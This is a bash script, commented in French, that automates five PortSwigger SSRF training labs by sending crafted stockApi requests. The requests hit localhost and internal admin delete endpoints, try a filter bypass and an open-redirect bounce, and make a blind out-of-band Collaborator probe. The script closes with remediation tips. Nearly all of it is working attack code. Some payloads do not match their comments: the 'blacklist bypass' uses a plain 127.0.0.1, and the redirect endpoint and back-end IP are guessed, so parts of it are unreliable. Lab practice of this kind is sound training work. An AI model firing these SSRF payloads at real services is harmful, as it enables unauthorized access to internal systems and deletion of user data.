#!/bin/bash

# --------- Utilisation ---------
# ./script.sh https://<lab>.web-security-academy.net
# --------------------------------

if [ -z "$1" ]; then
    echo "Usage: $0 <LAB_URL>"
    exit 1
fi

LAB_URL="$1"
COOKIE="session=<your-session-cookie>" # À adapter si besoin

print_sep() {
    echo "------------------------------------------------------"
}

# Challenge 1: Basic SSRF against the local server
challenge_basic_localhost() {
    print_sep
    echo "[Challenge 1] Basic SSRF against the local server"
    # Stock check SSRF sur localhost
    resp=$(curl -sk -X POST "$LAB_URL/product/stock" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "stockApi=http://localhost/admin/delete?username=carlos")
    if echo "$resp" | grep -iq "Congratulations\|flag"; then
        echo "[+] Flag ou succès détecté ! (localhost SSRF)"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 2: Basic SSRF against another back-end system
challenge_basic_backend() {
    print_sep
    echo "[Challenge 2] Basic SSRF against another back-end system"
    # Stock check SSRF sur 192.168.0.1:8080
    resp=$(curl -sk -X POST "$LAB_URL/product/stock" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "stockApi=http://192.168.0.1:8080/admin/delete?username=carlos")
    if echo "$resp" | grep -iq "Congratulations\|flag"; then
        echo "[+] Flag ou succès détecté ! (backend SSRF)"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 3: SSRF with blacklist-based input filter
challenge_blacklist_filter() {
    print_sep
    echo "[Challenge 3] SSRF with blacklist-based input filter"
    # Bypass blacklist (ex: use 127.0.0.1, decimal, or @)
    resp=$(curl -sk -X POST "$LAB_URL/product/stock" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "stockApi=http://127.0.0.1/admin/delete?username=carlos")
    if echo "$resp" | grep -iq "Congratulations\|flag"; then
        echo "[+] Flag ou succès détecté ! (blacklist bypass SSRF)"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 4: SSRF with filter bypass via open redirection vulnerability
challenge_open_redirect() {
    print_sep
    echo "[Challenge 4] SSRF with filter bypass via open redirection vulnerability"
    # Utiliser un endpoint open redirect du site pour rebondir vers l'admin interne
    # Ex: /redirect?url=http://localhost/admin/delete?username=carlos
    resp=$(curl -sk -X POST "$LAB_URL/product/stock" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "stockApi=$LAB_URL/redirect?url=http://localhost/admin/delete?username=carlos")
    if echo "$resp" | grep -iq "Congratulations\|flag"; then
        echo "[+] Flag ou succès détecté ! (open redirect SSRF)"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 5: Blind SSRF with out-of-band detection
challenge_blind_ssrf() {
    print_sep
    echo "[Challenge 5] Blind SSRF with out-of-band detection"
    # Utiliser un domaine Collaborator ou Burp pour observer l'out-of-band (à adapter)
    COLLAB_DOMAIN="your-collaborator-id.burpcollaborator.net"
    resp=$(curl -sk -X POST "$LAB_URL/product/stock" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "stockApi=http://$COLLAB_DOMAIN/")
    echo "[*] Vérifiez dans Burp Collaborator si une interaction a eu lieu avec $COLLAB_DOMAIN"
}

print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- N'autorisez jamais l'accès aux adresses internes ou localhost via des paramètres utilisateur."
    echo "- Implémentez une validation stricte des URLs côté serveur (whitelist, DNS resolution, etc.)."
    echo "- Désactivez les redirections ouvertes et surveillez les requêtes sortantes."
    echo "- Pour les labs PortSwigger, adaptez les endpoints et payloads selon le scénario."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/ssrf"
}

print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "Challenges testés :"
    echo "1. Basic SSRF against the local server"
    echo "2. Basic SSRF against another back-end system"
    echo "3. SSRF with blacklist-based input filter"
    echo "4. SSRF with filter bypass via open redirection vulnerability"
    echo "5. Blind SSRF with out-of-band detection"
    echo "Contrôle automatique du flag ou message de succès (sauf blind SSRF : vérifier Collaborator)."
    print_sep
}

echo "=== Script PortSwigger SSRF (noms des challenges) ==="
challenge_basic_localhost
challenge_basic_backend
challenge_blacklist_filter
challenge_open_redirect
challenge_blind_ssrf
print_remediation
print_summary

# End of script
